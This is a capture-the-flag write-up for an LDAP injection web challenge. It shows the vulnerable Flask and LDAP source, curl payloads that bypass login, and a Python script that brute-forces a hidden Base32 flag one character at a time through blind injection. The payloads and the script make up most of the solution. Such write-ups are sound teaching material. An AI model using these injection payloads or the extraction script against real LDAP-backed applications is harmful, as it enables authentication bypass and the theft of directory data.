
# Revenge of the Directory 

 * Category: Web
 * Solved by the JCTF Team

## Description

> who needs credentials when you can bend the directory to your will?
> 
> Abuse the app to exfiltrate the flag and make the system regret denying you access!
> 
> You’ll need to complete the OUtbreak challenge before this one. 

The application sources were attached.

<details>

<summary>Click to view sources</summary>

#### index.py

```python
from flask import Flask, render_template, request
from auth import authenticate_user

app = Flask("App")

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    username = authenticate_user(username, password)
    if username:
        return render_template("welcome.html", username=username)
    else:
        return render_template('login.html', error='Username or password is incorrect')

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000, debug=True)

```

#### auth.py

```python
import ldap3
import os
import base64
import time
import sys

SERVER = "ldap" 
LDAP_SERVER = f'ldap://{SERVER}' 
LDAP_USER = os.getenv("LDAP_USER", 'cn=admin,dc=owasp,dc=ctf')
LDAP_PASSWORD = os.getenv("LDAP_PASSWORD", 'admin')
BASE_DN = os.getenv('BASE_DN', 'dc=owasp,dc=ctf')
FLAG = base64.b32encode((os.getenv("FLAG") or "flag{yeah_not_the_real_flag}").encode()).decode()

def create_ldap_connection():
        try:
            server = ldap3.Server(LDAP_SERVER, port=1389, get_info=ldap3.ALL)
            connection = ldap3.Connection(server, user=LDAP_USER, password=LDAP_PASSWORD, auto_bind=True)
            return connection
        except Exception as e:
            print(f"Failed to connect to LDAP server, retrying... Error: {e}")

def authenticate_user(username: str, password: str):
    connection = create_ldap_connection()
    if connection is None:
        return None
    
    try:
        search_filter = f"(&(cn={username})(userPassword={password}))" 
        connection.search(
        search_base=BASE_DN,
        search_filter=search_filter,
        search_scope=ldap3.SUBTREE,
        attributes=['cn']
        )
        result = connection.entries

        if result:
            return result[0].cn.value[1]
        else:
            return None

    except Exception as e:
        print(e, file=sys.stderr)
    finally:
        connection.unbind()
    return None


time.sleep(3)
connection = create_ldap_connection()
connection.modify(
        dn="cn=DaGoat,ou=users,dc=owasp,dc=ctf",
        changes={'description': [(ldap3.MODIFY_REPLACE, [FLAG])]}
    )

if connection.result['result'] == 0:
        print('Description updated successfully')
else:
        print('Modify failed:', connection.result)
```

#### docker-compose.yml

```yml
version: "3"

services:
  ldap:
    image: bitnami/openldap:latest
    environment:
      LDAP_ROOT: 'dc=owasp,dc=ctf'
      LDAP_ADMIN_DN : 'cn=admin,dc=owasp,dc=ctf'
      LDAP_ADMIN_USERNAME: 'admin'
      LDAP_ADMIN_PASSWORD: 'admin'
      LDAP_USERS: 'DaGoat'
      LDAP_PASSWORDS: 'fake'
    ports:
      - "1389:1389"
    restart: always

  backend:
    build: backend
    depends_on:
      - ldap
    expose:
      - "5000"  
    environment:
      FLAG: "AppSec-IL{fake_flag}" 
    restart: always
  
```

</details>


## Solution

This is the follow-up for OUtbreak. Let's start by trying the trick that allowed us
to login there:

```console
┌──(user@kali3)-[/media/sf_CTFs/appsec/Revenge_of_the_directory]
└─$ curl 'https://revenge-of-the-directory.appsecil.ctf.today/login' \
  -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw 'username=DaGoat&password=*%29%28objectClass%3D*' -s | grep DaGoat -A 3
        <h1>Welcome, DaGoat!</h1>
        <h6>(Or a stranger?)</h6>
        <p class="message">You have successfully logged in.</p>
        <h3>Just in case any unauthorized individuals are sneaking around... I've hidden the flag in the description.</h3>
```

It still works, but this time the flag is hidden *elsewhere* - in the description of DaGoat's
entry (encoded as Base32). While we can control (to some extent) the query in `authenticate_user`,
we can't control what it returns - we can't actually have it return the flag. However,
what we *can* do is craft a query that leaks the (base32 encoded) flag character by character.

For example, to leak the first encoded character of the flag, we guess a character and 
craft the filter so that if we guessed correctly, the filter will return a result and we'll
log in. Otherwise, the filter will return an empty result and we'll stay logged out.

Once we have this, we simply need to iterate all possible Base32 characters to leak the first
character, then apply the same method to leak the next one and so on.

This is an example for the behavior when the guess is incorrect:

```console
┌──(user@kali3)-[/media/sf_CTFs/appsec/Revenge_of_the_directory]
└─$ curl 'https://revenge-of-the-directory.appsecil.ctf.today/login' \
  -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw 'username=DaGoat&password=*)(|(description=A*)' -s | grep Welcome
```

And this is how it would look like if the guess is correct:

```console
┌──(user@kali3)-[/media/sf_CTFs/appsec/Revenge_of_the_directory]
└─$ curl 'https://revenge-of-the-directory.appsecil.ctf.today/login' \
  -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw 'username=DaGoat&password=*)(|(description=I*)' -s | grep Welcome
    <title>Welcome</title>
        <h1>Welcome, DaGoat!</h1>
```

We can have ChatGPT create an exploitation script in seconds:

```python
import requests

URL = 'https://revenge-of-the-directory.appsecil.ctf.today/login'
CHARSET = 'IABCDEFGHIJKLMNOPQRSTUVWXYZ234567'  # Base32 character set
PREFIX = ''  # Known flag prefix so far
USERNAME = 'DaGoat'

def try_char(prefix, c):
    password = f'*)(|(description={prefix + c}*)'
    data = {
        'username': USERNAME,
        'password': password
    }

    try:
        r = requests.post(URL, data=data)
        return 'Welcome' in r.text
    except Exception as e:
        print(f"Request failed for {prefix + c}: {e}")
        return False

def brute_force_flag():
    global PREFIX
    print("[*] Starting brute-force...")

    while True:
        found = False
        for c in CHARSET:
            print(f"[*] Trying: {PREFIX + c}")
            if try_char(PREFIX, c):
                PREFIX += c
                print(f"[+] Found: {PREFIX}")
                found = True
                break
        if not found:
            print("[!] No match found for next character. Assuming flag is complete.")
            break

    print(f"[🏁] Base32 Flag: {PREFIX}")

if __name__ == '__main__':
    brute_force_flag()
```

We let it run and eventually get the flag:

```
┌──(user@kali3)-[/media/sf_CTFs/appsec/Revenge_of_the_directory]
└─$ python3 solve.py
...
[*] Trying: IFYHAU3FMMWUSTD3GVRXEMTQOQYWSTTHL52DAX3FPBTGY2LUOI2HIZK7GFJV6M3WNFWH23
[*] Trying: IFYHAU3FMMWUSTD3GVRXEMTQOQYWSTTHL52DAX3FPBTGY2LUOI2HIZK7GFJV6M3WNFWH24
[*] Trying: IFYHAU3FMMWUSTD3GVRXEMTQOQYWSTTHL52DAX3FPBTGY2LUOI2HIZK7GFJV6M3WNFWH25
[*] Trying: IFYHAU3FMMWUSTD3GVRXEMTQOQYWSTTHL52DAX3FPBTGY2LUOI2HIZK7GFJV6M3WNFWH26
[*] Trying: IFYHAU3FMMWUSTD3GVRXEMTQOQYWSTTHL52DAX3FPBTGY2LUOI2HIZK7GFJV6M3WNFWH27
[!] No match found for next character. Assuming flag is complete.
[🏁] Base32 Flag: IFYHAU3FMMWUSTD3GVRXEMTQOQYWSTTHL52DAX3FPBTGY2LUOI2HIZK7GFJV6M3WNFWH2
```

We decode it and get the flag:

```console
┌──(user@kali3)-[/media/sf_CTFs/appsec/Revenge_of_the_directory]
└─$ echo IFYHAU3FMMWUSTD3GVRXEMTQOQYWSTTHL52DAX3FPBTGY2LUOI2HIZK7GFJV6M3WNFWH2 | base32 -d
AppSec-IL{5cr2pt1iNg_t0_exflitr4te_1S_3vil}
```